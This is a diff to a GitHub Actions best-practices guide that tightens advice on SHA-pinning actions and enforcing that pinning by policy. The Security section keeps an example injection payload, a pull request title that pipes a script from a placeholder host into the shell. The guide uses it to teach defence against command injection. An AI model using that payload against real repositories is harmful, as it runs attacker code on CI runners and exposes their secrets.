@@ -291,7 +291,8 @@ In repo settings → Environments → `production`: required reviewers, wait tim
 ## Tooling
 
 - **Linting**: `actionlint` on every workflow file — it catches shell quoting bugs, bad `if:` expressions, and invalid `runs-on` before a push burns a CI minute.
-- **Pinning**: Dependabot or Renovate with `pin-github-action` so third-party actions stay digest-pinned *and* updated. Pinning without an updater just means running known-vulnerable actions forever.
+- **Pinning**: Dependabot or Renovate with `pin-github-action` so actions stay SHA-pinned *and* updated. Pinning without an updater just means running known-vulnerable actions forever. Resolve a tag to its SHA with `gh api repos/actions/checkout/git/ref/tags/v5 --jq .object.sha`, and keep the human-readable version in a trailing comment so reviewers can see what moved.
+- **Enforce the pin, don't rely on review.** Since 2025 the organisation's allowed-actions policy can *require* full-SHA pinning: any workflow referencing an action by tag fails outright. That is the control that survives a rushed PR — the convention in a style guide is not.
 - **Local runs**: `act` for fast iteration on job logic. It diverges from hosted runners on services and caching, so confirm on a real runner before merging.
 - **Secret scanning**: enable push protection and secret scanning on the repository. `zizmor` audits workflows specifically for injection and privilege mistakes.
 - **Caching**: `actions/cache` with a lockfile-hash key, or the language-native setup action's built-in cache (`setup-node --cache`). Never cache anything derived from a secret.
@@ -300,7 +301,7 @@ In repo settings → Environments → `production`: required reviewers, wait tim
 
 ## Security
 
-A workflow is remote code execution triggered by strangers. The threat model is an attacker who opens a pull request.
+A workflow is remote code execution triggered by strangers. The threat model is an attacker who opens a pull request — and, increasingly, an attacker who compromises a maintainer of an action you use. The March 2025 `tj-actions/changed-files` compromise moved existing tags to malicious code and dumped runner memory (secrets) into build logs across thousands of repositories; every repo pinned by SHA was unaffected, and every repo pinned by tag was not. That incident is the argument for the rule below.
 
 - **`pull_request_target` runs with secrets and write permissions against untrusted code.** If you use it, never check out the PR head, and never run a build or install script from the fork — `npm ci` alone executes attacker-controlled lifecycle scripts. Prefer `pull_request` plus a separate, manually-approved deploy workflow.
 - **Never interpolate untrusted input into `run:`.** `${{ github.event.pull_request.title }}` inside a shell step is command injection — a PR titled `"; curl evil.sh | sh; #` executes on your runner with your secrets. Pass it through `env:` and reference `"$TITLE"`, which never gets evaluated as shell.
@@ -341,7 +342,7 @@ jobs:
 
 ## What to avoid
 
-- `actions/checkout@v4` (a tag) for third-party actions in production workflows. Tag pinning is fine for first-party (`actions/*`, `github/*`) only because GitHub itself controls those.
+- Any tag reference — including `actions/checkout@v4` — in a production workflow. The old carve-out for first-party `actions/*` no longer holds up: a full-length commit SHA is the only immutable reference GitHub recognises, and it is what GitHub's own policy enforcement checks for. Pin everything.
 - Long-lived `AWS_ACCESS_KEY_ID` / `GCP_SA_KEY` secrets when OIDC is available.
 - `permissions: write-all`. Or omitting `permissions:` entirely on a public repo.
 - `pull_request_target` + `actions/checkout` of PR code without a manual gate.
